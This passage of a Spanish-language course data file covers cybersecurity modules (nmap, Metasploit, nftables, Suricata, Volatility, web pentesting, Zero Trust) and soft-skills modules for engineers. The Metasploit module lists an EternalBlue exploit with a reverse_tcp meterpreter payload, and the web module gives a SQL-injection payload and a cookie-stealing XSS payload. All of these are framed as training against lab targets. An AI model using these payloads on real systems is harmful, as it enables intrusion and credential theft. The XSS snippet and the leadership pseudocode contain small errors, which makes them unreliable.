        steps: [
          '1. Crea docker-compose con nginx:latest y httpd:alpine en puertos expuestos.',
          '2. Levanta el stack: \`docker-compose up -d\`.',
          '3. Ejecuta escaneo SYN a ambos contenedores.',
          '4. Ejecuta -sV y guarda salida en nmap_report.txt.'
        ],
        acceptance: [
          '✅ Contenedores accesibles en los puertos definidos.',
          '✅ Output Nmap muestra servicios correctos y versiones.',
          '✅ Entrega docker-compose.yml y nmap_report.txt.'
        ],
        hint: 'Recuerda mapear puertos con la sección ports de Compose.',
        extra: 'Añade script básico que instale nmap dentro de un contenedor Alpine.'
      }
    ],
    resources: [
      { title: '📖 Nmap Reference Guide', url: 'https://nmap.org/book/man.html', description: 'Manual oficial de Nmap' },
      { title: '📚 NSE Script Documentation', url: 'https://nmap.org/nsedoc/', description: 'Repositorio de scripts NSE' }
    ],
    tips: [
      '💡 Usa \`-oA\` para generar formatos normal, XML y grepable a la vez.',
      '💡 Ajusta \`--max-retries\` para acelerar o ralentizar según necesidad.',
      '💡 Combina con \`masscan\` para escaneos ultrarrápidos a gran escala.'
    ]
  }
},

/* ────────── CS3 – Explotación Básica Metasploit (Complejidad 2) ────────── */
{
  id: 'CS3',
  title: 'Explotación Básica Metasploit',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 2,
  prerequisites: ['CS2'],
  related: [],
  summary: 'Uso de exploits y payloads reverse_tcp. Ejercicio: VM vulnerable.',
  content: {
    theory: `
# Metasploit Framework — Automatizando la Explotación

1. **msfconsole**: interfaz principal de Metasploit.  
2. **Modules**  
   - *exploit/*: pruebas de vulnerabilidades.  
   - *payload/*: payloads (reverse_tcp, bind_tcp).  
3. **Handlers**: listener que espera la conexión inversa.`,
    examples: [
      {
        title: '⚙️ Configurar y Lanzar Exploit',
        code: `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOST 192.168.56.101
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > run`
      }
    ],
    exercises: [
      {
        title: '🎯 Ex 1 — CTF Local con Metasploitable2',
        objective: 'Obtener shell Meterpreter de Metasploitable2 y capturar un “flag”.',
        deliverable: 'Captura de pantalla de la sesión y flag.txt.',
        steps: [
          '1. Descarga y levanta Metasploitable2 en VirtualBox.',
          '2. Configura msfconsole con exploit appropriate (e.g., vsftpd_backdoor).',
          '3. Configura handler: \`use exploit/multi/handler\`, payload reverse_tcp.',
          '4. Ejecuta el exploit y localiza /home/flag.txt en la sesión Meterpreter.'
        ],
        acceptance: [
          '✅ Shell activa listada con \`sessions -l\`.',
          '✅ Contenido de flag.txt capturado correctamente.',
          '✅ Documentación paso a paso en un archivo report.md.'
        ],
        hint: 'Algunos exploits requieren versión específica de Metasploit.',
        extra: 'Automatiza con un script .rc para msfconsole.'
      }
    ],
    resources: [
      { title: '📖 Metasploit Unleashed', url: 'https://www.offensive-security.com/metasploit-unleashed/', description: 'Curso gratuito de Metasploit' },
      { title: '📦 Rapid7 Docs', url: 'https://docs.rapid7.com/metasploit/', description: 'Referencia oficial' }
    ],
    tips: [
      '💡 Limpia sesiones con \`sessions -K\` antes de nueva ejecución.',
      '💡 Usa \`set VERBOSE true\` para más detalles en la consola.'
    ]
  }
}
,/* ────────── CS4 – Hardening Linux (nftables) (Complejidad 3) ────────── */
  /* ────────── CS4 – Hardening Linux (nftables) (Complejidad 3) ────────── */
{
  id: 'CS4',
  title: 'Hardening Linux (nftables)',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 3,
  prerequisites: ['CS2'],
  related: [],
  summary: 'Política default-deny, servicios mínimos. Ejercicio: script firewall.',
  content: {
    theory: `
# Hardening Linux con nftables

## 1. Ventajas sobre iptables
- Motor en espacio de kernel “nft” (Netfilter Table) → rendimiento.
- Sintaxis declarativa y legible.
- Reglas en árboles (familia → tabla → cadena → regla).

## 2. Política Default-Deny
\`\`\`bash
nft add table inet filter
nft 'add chain inet filter input { type filter hook input priority 0; policy drop; }'
\`\`\`

## 3. Servicios Mínimos
Permitir solo SSH (22/tcp) y DNS interno (53/udp):
\`\`\`bash
nft add rule inet filter input tcp dport 22 ct state new,established accept
nft add rule inet filter input udp dport 53 ct state new,established accept
nft add rule inet filter input ct state established,related accept
\`\`\``,
    examples: [
      {
        title: '🛡️ Script firewall.sh',
        code: `#!/usr/bin/env bash
set -e
nft flush ruleset
nft add table inet filter
nft 'add chain inet filter input { type filter hook input priority 0; policy drop; }'
nft add rule inet filter input ct state established,related accept
nft add rule inet filter input tcp dport 22 ct state new,established accept
nft add rule inet filter input icmp type echo-request limit rate 5/second accept`
      }
    ],
    exercises: [
      {
        title: '🔐 Ex 1 — Script Firewall Default-Deny',
        objective: 'Crear script reproducible de hardening para servidor web.',
        deliverable: 'firewall.sh + README de uso.',
        steps: [
          '1. Elimina iptables legacy y habilita nftables.service.',
          '2. Crea tabla/chain inet filter con policy drop.',
          '3. Abre puertos 22/tcp y 443/tcp exclusivamente.',
          '4. Añade logging de paquetes DROP con rate-limit.'
        ],
        acceptance: [
          '✅ \`nft list ruleset\` muestra política drop.',
          '✅ Servicio web y SSH accesibles; otros puertos cerrados.',
          '✅ Logs en /var/log/kern.log muestran drops (rate ≤ 2/s).'
        ],
        hint: 'Usa sentencia \`limit rate 10/minute\` para evitar flood.',
        extra: 'Empaqueta como unit systemd que restaure reglas al boot.'
      }
    ],
    resources: [
      { title: '📖 nftables Wiki', url: 'https://wiki.nftables.org/', description: 'Referencia oficial y tutoriales' },
      { title: '🛠️ Firewalld + nftables', url: 'https://firewalld.org/documentation/', description: 'Capa de abstracción moderna' }
    ],
    tips: [
      '💡 Valida reglas con \`nft -c -f file.nft\` antes de aplicarlas.',
      '💡 Siempre incluye regla established,related antes del DROP.'
    ]
  }
},

/* ────────── CS5 – Detección IDS con Suricata (Complejidad 3) ────────── */
{
  id: 'CS5',
  title: 'Detección IDS con Suricata',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 3,
  prerequisites: ['CS4'],
  related: [],
  summary: 'Reglas y alertas, EVE JSON. Ejercicio: firma HTTP malicious.',
  content: {
    theory: `
# Suricata — IDS/IPS de Alta Velocidad

1. **Motores**: multi-thread, DPI, inspección TLS.  
2. **Outputs**  
   - EVE JSON (eventos estructurados).  
   - Unified2, PCAP.  
3. **Reglas**  
   - Formato Snort-like + keywords Suricata extra.`,
    examples: [
      {
        title: '📑 Regla HTTP Malicious',
        code: `alert http any any -> any any (
  msg:"CS5 Malicious User-Agent";
  flow:to_server,established;
  http.user_agent; content:"BadBot";
  classtype:trojan-activity; sid:9000001; rev:1;
)`
      },
      {
        title: '⚙️ suricata.yaml extract',
        code: `outputs:
  - eve-log:
      enabled: yes
      types:
        - alert
        - http`
      }
    ],
    exercises: [
      {
        title: '🚨 Ex 1 — Firma y Alerta Personalizada',
        objective: 'Detectar “BadBot” en cabecera User-Agent y registrar en EVE.',
        deliverable: 'Regla .rules + captura EVE JSON con alerta.',
        steps: [
          '1. Instala Suricata y habilita eve-log.',
          '2. Añade regla sid 9000001 y recarga servicio.',
          '3. Usa curl con -A "BadBot" contra servidor local.',
          '4. Verifica alerta en /var/log/suricata/eve.json.'
        ],
        acceptance: [
          '✅ suricata-verify sin errores de sintaxis.',
          '✅ Eve.json contiene alerta con sid 9000001.',
          '✅ Archivo PCAP muestra solicitud HTTP con BadBot.'
        ],
        hint: 'Habilita streams: yes en suricata.yaml para HTTP parsing.',
        extra: 'Envía alerta a Elasticsearch y visualiza en Kibana.'
      }
    ],
    resources: [
      { title: '📖 Suricata Docs', url: 'https://docs.suricata.io/', description: 'Guía oficial' },
      { title: '⚡ OISF Rules', url: 'https://rules.emergingthreats.net/', description: 'Reglas emergentes gratuitas' }
    ],
    tips: [
      '💡 Ajusta \`detect-engine profile: medium\` para balancear rendimiento.',
      '💡 Usa \`suricata-update\` para mantener reglas al día.'
    ]
  }
},

/* ────────── CS6 – Análisis Forense (Volatility) (Complejidad 4) ────────── */
{
  id: 'CS6',
  title: 'Análisis Forense (Volatility)',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 4,
  prerequisites: ['CS3'],
  related: [],
  summary: 'Dump memoria, timeline. Ejercicio: hallar keylogger.',
  content: {
    theory: `
# Volatility3 — Framework Forense de Memoria

1. **Soporte multi-OS**: Windows, Linux, macOS.  
2. **Plugins clave**  
   - pslist, pstree: procesos.  
   - netscan: conexiones de red.  
   - malfind: regiones sospechosas.  
3. **Perfil automático**: detecta versión kernel.`,
    examples: [
      {
        title: '🗂️ Listar Procesos',
        code: `vol -f memdump.raw windows.pslist.PsList`
      },
      {
        title: '🕒 Timeline Linux',
        code: `vol -f mem.raw --profile=Linux ubuntu_2004 linux.bash.Bash`
      }
    ],
    exercises: [
      {
        title: '🔍 Ex 1 — Encontrar Keylogger',
        objective: 'Identificar proceso keylogger “kl.py” en dump de memoria Linux.',
        deliverable: 'Reporte PDF con evidencias y comando exacto.',
        steps: [
          '1. Descarga mem_ubuntu.raw proporcionado.',
          '2. Ejecuta linux.pslist y identifica procesos sospechosos.',
          '3. Usa linux.proc.Maps para ver áreas de memoria y strings.',
          '4. Localiza “kl.py” y extrae path completo.',
          '5. Documenta comandos y hallazgos en reporte.'
        ],
        acceptance: [
          '✅ Proceso con cmdline “python kl.py” localizado.',
          '✅ Hash SHA256 del binario extraído en reporte.',
          '✅ Incluir captura de vol output en PDF.'
        ],
        hint: 'Utiliza linux.bash.Bash para recuperar historia de comandos.',
        extra: 'Reconstruye archivo kl.py con plugin linux.dump_map.'
      }
    ],
    resources: [
      { title: '📖 Volatility3 Docs', url: 'https://volatility3.org/', description: 'Documentación del framework' },
      { title: '📝 Memory Forensics Cheat Sheet', url: 'https://digital-forensics.sans.org/blog/2020/06/15/memory-forensics-cheat-sheet/', description: 'Guía rápida de comandos' }
    ],
    tips: [
      '💡 Calcula hashes de dump antes de análisis para cadena de custodia.',
      '💡 Usa \`--parallelism off\` en sistemas con poca RAM.'
    ]
  }
}
,/* ────────── CS7 – Pentesting Web Avanzado (Complejidad 4) ────────── */
 /* ────────── CS7 – Pentesting Web Avanzado (Complejidad 4) ────────── */
{
  id: 'CS7',
  title: 'Pentesting Web Avanzado',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 4,
  prerequisites: ['CS3'],
  related: [],
  summary: 'SQLi, XSS, CSRF cadenas. Ejercicio: OWASP Juice Shop.',
  content: {
    theory: `
# Pentesting Web Avanzado

## 1. SQL Injection (SQLi) Moderno
- **Boolean-based blind**: \`AND 1=1\`, \`AND 1=2\`.  
- **Time-based blind**: \`SLEEP(5)\`.  
- **WAF Evasion**: case switching, inline comments.

## 2. Cross-Site Scripting (XSS)
- **Reflejado** vs **Persistente**.  
- Políticas CSP y bypasses (nonce-reuse, \`javascript:\` URL).

## 3. CSRF en Cadenas
- **SameSite=Lax/None** implicaciones.  
- Exploitar flujos multi-step (cesta, compra, logout).  

## 4. Herramientas Clave
- **Burp Suite Professional** (Repeater, Intruder, Collaborator).  
- **sqlmap** custom tamper scripts.  
- **XSStrike** auto-fuzz XSS.`,
    examples: [
      {
        title: '💉 SQLi Time-Based Payload',
        code: `' OR IF(ASCII(SUBSTRING((SELECT user()),1,1))>75,SLEEP(5),0)-- -`
      },
      {
        title: '⚔️ XSS CSP Bypass',
        code: `<svg onload="fetch('/pwn',{method:'POST',body=document.cookie})">`
      }
    ],
    exercises: [
      {
        title: '🏆 Ex 1 — OWASP Juice Shop “Score Board”',
        objective: 'Completar 10 retos de dificultad media-alta en Juice Shop.',
        deliverable: 'Captura pantalla scoreboard + write-up de 5 retos.',
        steps: [
          '1. Despliega Juice Shop en Docker (tag latest).',
          '2. Habilita \`CHALLENGE_DIFFICULTY=expert\` en ENV.',
          '3. Explota al menos: Login Admin CSRF, DOM-XSS, DB schema leak.',
          '4. Documenta vectores y bypasses usados.',
          '5. Sube scoreboard.png y write-up.md.'
        ],
        acceptance: [
          '✅ 10 retos “Solved” marcados.',
          '✅ Write-up explica cada payload y mitigación.',
          '✅ Captura muestra puntuación total actualizada.'
        ],
        hint: 'Usa Burp Collaborator para retos de SSRF o email leak.',
        extra: 'Automatiza explotación con Python-Requests + csrf token parsing.'
      }
    ],
    resources: [
      { title: '📖 Web Security Academy', url: 'https://portswigger.net/web-security', description: 'Laboratorios de PortSwigger' },
      { title: '🛠️ OWASP Juice Shop', url: 'https://owasp.org/www-project-juice-shop/', description: 'Aplicación vulnerable intencionalmente' }
    ],
    tips: [
      '💡 Configura Burp con match-replace para evadir WAF básico.',
      '💡 Usa Docker network “host” para que Collaborator reciba callbacks en local.',
      '💡 Lee cabeceras CSP y traza rutas de fallback (e.g., \`font-src\`).'
    ]
  }
},

/* ────────── CS8 – Zero Trust Architecture (Complejidad 5) ────────── */
{
  id: 'CS8',
  title: 'Zero Trust Architecture',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 5,
  prerequisites: ['CS4', 'CS5'],
  related: [],
  summary: 'Autenticación continua, micro-segmentación. Ejercicio: diagrama ZTA.',
  content: {
    theory: `
# Zero Trust Architecture (ZTA)

## 1. Principios
- **Never Trust, Always Verify** – no existe “intranet segura”.  
- **Micro-segmentación** – divide red en zonas de mínima confianza.  
- **Evaluación continua** – autenticación y autorización en cada petición.

## 2. Componentes Clave
| Componente            | Función                                          |
|-----------------------|--------------------------------------------------|
| IdP (OIDC/SAML)       | Autenticación centralizada con MFA              |
| Policy Decision Point | Evalúa contexto ≈ \`if user.device_trust && geo\` |
| Policy Enforcement    | Proxy/agent aplica decisión (Envoy, Istio)      |

## 3. Flujos de AutZ Contínua (OAuth2/OIDC + mTLS)
1. Usuario → App → OIDC flow.  
2. Proxy ZTA inspecciona claims y device posture.  
3. Muestra token de corta vida (5 min) + certificado mTLS atado.

## 4. Modelos de Micro-segmentación
- **Identity-aware proxy** (BeyondCorp, Cloudflare Zero Trust).  
- **Service Mesh** (Istio, Linkerd) con *AuthorizationPolicies*.`,
    examples: [
      {
        title: '🖇️ Istio AuthorizationPolicy',
        code: `apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata: { name: allow-frontend }
spec:
  selector: { matchLabels: { app: frontend } }
  rules:
  - from:
    - source:
        requestPrincipals: ["accounts.google.com/*"]
    to:
    - operation:
        methods: ["GET","POST"]`
      },
      {
        title: '🔐 Cloudflare Access Policy',
        code: `{
  "action": "allow",
  "identity": {
    "emails": ["*@empresa.com"],
    "groups": ["Engineering"]
  },
  "device_posture": ["healthy"]
}`
      }
    ],
    exercises: [
      {
        title: '📐 Ex 1 — Diagrama Zero Trust para Empresa SaaS',
        objective: 'Diseñar arquitectura ZTA cubriendo acceso remoto y servicios internos.',
        deliverable: 'Diagrama (PNG/SVG) + descripción de componentes.',
        steps: [
          '1. Define dominios de confianza: usuarios, dispositivos, workloads.',
          '2. Elige IdP (Okta) y proxy (Cloudflare Access o Istio).',
          '3. Diseña flujo de autenticación continuo con tokens 5 min + MFA.',
          '4. Añade micro-segmentación de redes en VPC (Public, Private, Admin).',
          '5. Entrega diagrama y tabla de controles (authN, authZ, logging).'
        ],
        acceptance: [
          '✅ Diagrama muestra todos los saltos (User→Proxy→Service).',
          '✅ Tabla mapea controles a principios Zero Trust.',
          '✅ Incluye plan de IAM mínimo y rotación de credenciales.'
        ],
        hint: 'Consulta referenciales NIST SP 800-207 para controles mínimos.',
        extra: 'Propón pipeline CI/CD que aplique políticas Istio via GitOps.'
      }
    ],
    resources: [
      { title: '📖 NIST SP 800-207', url: 'https://doi.org/10.6028/NIST.SP.800-207', description: 'Zero Trust Architecture standard' },
      { title: '📚 BeyondCorp Papers', url: 'https://cloud.google.com/beyondcorp', description: 'Diseño Google Zero Trust' }
    ],
    tips: [
      '💡 Tokens cortos + mTLS minimizan uso ilícito tras filtración.',
      '💡 Recopila logs unificados (proxy + service mesh) para auditoría.',
      '💡 Mantén inventario de activos y aplica etiqueta de sensibilidad.'
    ]
  }
}
,/* ────────── SS1 – Comunicación Clara (Complejidad 1) ────────── */
  /* ────────── SS1 – Comunicación Clara (Complejidad 1) ────────── */
{
  id: 'SS1',
  title: 'Comunicación Clara',
  category: 'Soft-Skills para ingenieros',
  activated: true,
  complexity: 1,
  prerequisites: [],
  related: [],
  summary: 'Modelo "IDEA": Intro, Detalle, Ejemplo, Acción. Ejercicio: resume un bug en 3 frases.',
  content: {
    theory: `
# Modelo IDEA — Hablar (o escribir) para que te entiendan

| Etapa | Propósito | Pregunta guía                        |
|-------|-----------|--------------------------------------|
| **I**ntro   | Enmarcar | ¿Por qué importa lo que diré?        |
| **D**etalle | Explicar | ¿Qué datos / hechos sostienen mi punto? |
| **E**jemplo | Ilustrar | ¿Cómo se ve en la práctica?        |
| **A**cción  | Cerrar   | ¿Qué quiero que hagas ahora?       |

## Buenas prácticas
- **≤ 140 caracteres** en la Intro si es texto o 10 s si es verbal.  
- Una diapositiva = una idea (ley de Singularidad).  
- Cierra siempre con _call-to-action_ explícito (“Aprobar PR”, “Agendar reunión”).`,
    examples: [
      {
        title: '✉️ Correo bug-fix con IDEA',
        code: `Intro: El último despliegue rompió pagos en Safari.
Detalle: El polyfill fetch no soporta cookies SameSite=None.
Ejemplo: 15 % drop-off en /checkout (Hotjar adjunto).
Acción: Revisen PR #252 antes de las 15:00 para hot-fix.`
      }
    ],
    exercises: [
      {
        title: '📝 Ex 1 — Resumen de Bug en 3 frases',
        objective: 'Aplicar IDEA para comunicar un incidente crítico.',
        deliverable: 'Comentario en ticket (o Slack) con ≤ 3 líneas.',
        steps: [
          '1. Piensa en un bug real de tu proyecto.',
          '2. Redacta Intro (impacto), Detalle (causa), Acción (siguiente paso).',
          '3. Pega tu texto en el ticket y pide feedback.'
        ],
        acceptance: [
          '✅ Tres frases diferenciadas en IDEA.',
          '✅ CTA medible (ej.: “mergear”, “revertir”).'
        ],
        hint: 'Evita jerga interna; imagina que te lee alguien no técnico.',
        extra: 'Adjunta un GIF o screenshot como Ejemplo visual.'
      }
    ],
    resources: [
      { title: '📖 “Made to Stick”', url: 'https://chipheath.com/books/made-to-stick/', description: 'Cómo hacer ideas memorables' },
      { title: '🎥 TED: Talk Like TED', url: 'https://youtu.be/2jlXfWJivO4', description: 'Claves de mensajes claros' }
    ],
    tips: [
      '💡 Abre con la “carta fuerte” (impacto o beneficio).',
      '💡 Usa verbos de acción; evita pasiva (“Se realizó…”).',
      '💡 Lee en voz alta: si suena raro, reescribe.'
    ]
  }
},

/* ────────── SS2 – Gestión del Tiempo (Pomodoro) (Complejidad 1) ────────── */
{
  id: 'SS2',
  title: 'Gestión del Tiempo (Pomodoro)',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 1,
  prerequisites: [],
  related: [],
  summary: 'Work/break 25/5. Ejercicio: track 4 pomodoros hoy.',
  content: {
    theory: `
# Técnica Pomodoro — Trabajo en Sprints de 25 min

1. **25 min de foco** (🍅)  
2. **5 min de descanso**  
3. Cada 4 pomodoros → pausa larga 15 min

## Neurociencia rápida
- Dopamina al completar ciclos → refuerzo positivo.  
- Micropausas reducen fatiga de corteza prefrontal (decisiones).`,
    examples: [
      {
        title: '⌚ CLI timer en Bash',
        code: `#!/usr/bin/env bash
for i in {1..4}; do
  tput bel; echo "Pomodoro $i iniciado" && sleep 1500   # 25 min
  tput bel; echo "Descanso 5 min" && sleep 300          # 5  min
done
echo "¡Hora de pausa larga!"; sleep 900`
      }
    ],
    exercises: [
      {
        title: '📈 Ex 1 — Rastrear 4 Pomodoros',
        objective: 'Registrar tareas y nivel de energía durante un bloque matutino.',
        deliverable: 'Tabla CSV (inicio, fin, tarea, energía 1–5).',
        steps: [
          '1. Elige lista de tareas enfocadas (coding, review, docs).',
          '2. Corre 4 pomodoros seguidos usando tu timer favorito.',
          '3. Al finalizar cada ciclo anota nivel de energía (1 cansado – 5 motivado).',
          '4. Analiza dónde cayeron tus picos/bajas.'
        ],
        acceptance: [
          '✅ CSV con 4 registros completos.',
          '✅ Gráfico opcional de energía vs tiempo (Excel o gnuplot).'
        ],
        hint: 'Silencia notificaciones; activa modo avión si es posible.',
        extra: 'Prueba break activo (estiramiento, agua) y compara energía.'
      }
    ],
    resources: [
      { title: '⏲️ TomatoTimer', url: 'https://tomato-timer.com/', description: 'Timer online minimalista' },
      { title: '📱 Focus To-Do', url: 'https://www.focustodo.cn/', description: 'App móvil + desktop Pomodoro + tasks' }
    ],
    tips: [
      '💡 Agrupa tareas similares en un mismo pomodoro para “batching”.',
      '💡 Termina cada ciclo dejando claro el siguiente paso (reduce fricción).',
      '💡 Ajusta a 50/10 si tu tarea requiere más tiempo de calentamiento.'
    ]
  }
},

/* ────────── SS3 – Feedback Constructivo (Complejidad 2) ────────── */
{
  id: 'SS3',
  title: 'Feedback Constructivo',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 2,
  prerequisites: ['SS1'],
  related: [],
  summary: 'Método SBI (Situation-Behavior-Impact). Ejercicio: feedback a compañero.',
  content: {
    theory: `
# Método SBI — Feedback Claro y Accionable

| Elemento     | Qué describir                               | Ejemplo |
|--------------|---------------------------------------------|---------|
| **S**ituation| Contexto específico (cuándo/dónde)          | “En la daily de hoy a las 9 am…” |
| **B**ehavior | Conducta observable (sin juicios)           | “interrumpiste a Juan 3 veces” |
| **I**mpact   | Efecto en equipo, cliente o resultado       | “esto hizo que no termináramos en 15 min” |

## Reglas de oro
- **Privado > Público** para feedback correctivo.  
- Formula **pregunta** al final (“¿Qué opinas?”) para co-crear plan.`,
    examples: [
      {
        title: '🔄 Feedback SBI en Pull Request',
        code: `S: En el PR #1024, sección utils.js  
B: Cambiaste nombre de función sin actualizar tests  
I: La suite CI falló y bloqueó otras integraciones  
→ ¿Podrías añadir tests o revertir el rename?`
      }
    ],
    exercises: [
      {
        title: '🤝 Ex 1 — Feedback a un Compañero',
        objective: 'Aplicar SBI para mejorar colaboración en code-review.',
        deliverable: 'Comentario real (o ficticio) con 3 párrafos SBI.',
        steps: [
          '1. Piensa en una situación reciente de trabajo en equipo.',
          '2. Escribe borrador con S, B, I en líneas separadas.',
          '3. Añade propuesta o pregunta abierta al final.',
          '4. Envía o comparte para revisión de pares.'
        ],
        acceptance: [
          '✅ Tres secciones diferenciadas (S/B/I).',
          '✅ Tono respetuoso y foco en hechos observables.',
          '✅ Incluye CTA o plan de mejora conjunta.'
        ],
        hint: 'Evita “siempre/nunca”; usa datos (“2 commit sin test”).',
        extra: 'Pide feedback sobre tu feedback y anota aprendizaje.'
      }
    ],
    resources: [
      { title: '🎓 Radical Candor', url: 'https://www.radicalcandor.com/', description: 'Modelo de feedback directo-cuidado' },
      { title: '📑 Atlassian Playbook – Feedback', url: 'https://www.atlassian.com/team-playbook/plays/feedback', description: 'Guía práctica con plantillas' }
    ],
    tips: [
      '💡 Da feedback positivo inmediatamente; el de mejora lo antes posible.',
      '💡 Acuerda acción y fecha (“revisamos en la retro del viernes”).',
      '💡 Reconoce tu sesgo: pregunta primero perspectiva del otro.'
    ]
  }
}
,/* ────────── SS4 – Negociación de Sueldo (Complejidad 2) ────────── */
  /* ────────── SS4 – Negociación de Sueldo (Complejidad 2) ────────── */
{
  id: 'SS4',
  title: 'Negociación de Sueldo',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 2,
  prerequisites: ['SS1'],
  related: [],
  summary: 'BATNA, rango ancla, silencio táctico. Ejercicio: role-play.',
  content: {
    theory: `
# Negociación de Sueldo — Estrategias Clave

## 1. BATNA (Best Alternative To a Negotiated Agreement)
Define tu mejor alternativa si no llegas a acuerdo (oferta de otra empresa, proyecto freelance).

## 2. Anclaje de Rango Salarial
- Investiga salarios de mercado  
- Propón un rango alto dentro de tu valor real  
- Primer número fija el punto de partida en la negociación

## 3. Silencio Táctico
- Haz tu oferta y espera sin hablar  
- El silencio ejerce presión leve y puede inducir concesiones

## 4. Técnicas de Persuasión
- **Reciprocidad**: ofrecer concesiones pequeñas  
- **Escasez**: destacar que tu tiempo y skills son limitados  
- **Autoridad**: mencionar certificaciones o proyectos relevantes`,
    examples: [
      {
        title: '💬 Diálogo de Role-Play',
        code: `Manager: “Estamos abiertos a hablar de rango.”  
Tú: “Basándome en mi experiencia y el mercado, busco entre 70k y 80k. ¿Cómo lo ves?”  
(manager calla)  
Manager: “Entiendo, podemos explorar 75k con revisión en 6 meses.”`
      }
    ],
    exercises: [
      {
        title: '🎭 Ex 1 — Role-Play de Negociación',
        objective: 'Practicar BATNA y anclaje con un compañero.',
        deliverable: 'Guión de 5 intercambios y reflexión escrita.',
        steps: [
          '1. Investiga salario de tu rol en tu región.',
          '2. Define tu BATNA y rango salarial objetivo.',
          '3. Con un colega, simula la negociación (rol manager/empleado).',
          '4. Aplica anclaje alto y usa silencio tras tu oferta.',
          '5. Documenta resultados y lecciones aprendidas.'
        ],
        acceptance: [
          '✅ Se usó anclaje con rango justificado.',
          '✅ Silencio aplicado después de la oferta inicial.',
          '✅ Reflexión menciona ajustes para próxima vez.'
        ],
        hint: 'Practica con cronómetro para sentir el silencio.',
        extra: 'Graba la simulación y analiza tu lenguaje corporal.'
      }
    ],
    resources: [
      { title: '📖 “Getting to Yes”', url: 'https://www.amazon.com/Getting-Yes-Negotiating-Agreement-Without/dp/0143118757', description: 'Negociación basada en principios' },
      { title: '📝 Salary Negotiation Guide', url: 'https://www.themuse.com/advice/salary-negotiation-tips', description: 'Artículos prácticos para tech' }
    ],
    tips: [
      '💡 Siempre investiga y documenta tus cifras antes de negociar.',
      '💡 Mantén un tono colaborativo, no confrontacional.',
      '💡 Sé flexible en beneficios si el salario no sube al 100%.'
    ]
  }
},

/* ────────── SS5 – Mentoría Efectiva (Complejidad 3) ────────── */
{
  id: 'SS5',
  title: 'Mentoría Efectiva',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 3,
  prerequisites: ['SS3'],
  related: [],
  summary: 'GROW model: Goal, Reality, Options, Will. Ejercicio: plan mentoreo junior.',
  content: {
    theory: `
# Modelo GROW — Estructura de la Mentoría

1. **G (Goal)**: Definir objetivo SMART del mentorado.  
2. **R (Reality)**: Analizar situación actual y obstáculos.  
3. **O (Options)**: Explorar alternativas y recursos.  
4. **W (Will)**: Comprometerse a acciones concretas y plazos.

## Buenas prácticas
- Escucha activa antes de sugerir  
- Preguntas abiertas (“¿Qué opciones ves?”)  
- Revisar progreso periódicamente`,
    examples: [
      {
        title: '🗣️ Conversación GROW',
        code: `Mentor: “¿Cuál tu meta en este sprint?” (Goal)  
Mentee: “Dominar testing con Jest.” (Goal)  
Mentor: “¿Qué pruebas has escrito hasta ahora?” (Reality)  
Mentee: “Solo los básicos.” (Reality)  
Mentor: “Opciones: pair programming o curso online.” (Options)  
Mentee: “Prefiero pair prog esta semana.” (Will)`
      }
    ],
    exercises: [
      {
        title: '📝 Ex 1 — Plan de Mentoría',
        objective: 'Crear un plan GROW para un ingeniero junior.',
        deliverable: 'Documento con secciones G, R, O, W y métricas.',
        steps: [
          '1. Entrevista al mentorado sobre sus metas.',
          '2. Documenta Realities actuales y brechas de skills.',
          '3. Lista al menos 3 opciones de aprendizaje.',
          '4. Finaliza con acciones (Will) y fechas límite.',
          '5. Revisa plan con mentorado y ajusta si es necesario.'
        ],
        acceptance: [
          '✅ Objetivos SMART bien definidos.',
          '✅ Opciones variadas y realistas.',
          '✅ Compromisos con plazos claros.'
        ],
        hint: 'Usa verbos medibles (“completar 3 tests unitarios”).',
        extra: 'Integra check-in semanal en tu calendario.'
      }
    ],
    resources: [
      { title: '📖 “Co-Active Coaching”', url: 'https://www.amazon.com/Co-Active-Coaching-Change-People-Performance/dp/1857885672', description: 'Guía profunda de coaching' },
      { title: '🎥 GROW Model Explained', url: 'https://www.youtube.com/watch?v=6LKCw32a88Y', description: 'Video explicativo de GROW' }
    ],
    tips: [
      '💡 Usa notas compartidas en Google Docs para transparencia.',
      '💡 Mantén sesiones cortas (30–45 min) con agenda clara.',
      '💡 Revisa logros previos antes de cada sesión.'
    ]
  }
},

/* ────────── SS6 – Liderazgo Situacional (Complejidad 3) ────────── */
{
  id: 'SS6',
  title: 'Liderazgo Situacional',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 3,
  prerequisites: ['SS5'],
  related: [],
  summary: 'Dirigir → Delegar según madurez. Ejercicio: evalúa tu equipo.',
  content: {
    theory: `
# Liderazgo Situacional — Hersey & Blanchard

| Estilo       | Descripción                                   | Uso cuando…                          |
|--------------|-----------------------------------------------|--------------------------------------|
| **Dirigir**  | Alta dirección, bajo apoyo                   | Equipo nuevo sin experiencia         |
| **Coaching** | Alta dirección, alto apoyo                   | Algo de experiencia, falta confianza |
| **Apoyar**   | Bajo dirección, alto apoyo                   | Competentes, necesitan motivación    |
| **Delegar**  | Bajo dirección, bajo apoyo                   | Altamente competentes y motivados    |

## Evaluación de Madurez
- **M1–M4**: combina habilidad y voluntad del colaborador.`,
    examples: [
      {
        title: '📊 Matriz de Estilo vs Madurez',
        code: `// Pseudocódigo de selección de estilo
if (madurez <= 2) estilo = 'Dirigir';
else if (madurez <= 3) estilo = 'Coaching';
else if (madurez == 4) estilo = 'Delegar';
else estilo = 'Apoyar';`
      }
    ],
    exercises: [
      {
        title: '🔍 Ex 1 — Evaluación de Equipo',
        objective: 'Clasificar a 3 miembros según madurez y definir estilo.',
        deliverable: 'Tabla con nombre, madurez M1–M4, estilo recomendado.',
        steps: [
          '1. Entrevista breve a cada miembro sobre skills y motivación.',
          '2. Asigna nivel de madurez (1 a 4).',
          '3. Selecciona estilo de liderazgo para cada caso.',
          '4. Escribe recomendaciones de comunicación para cada estilo.'
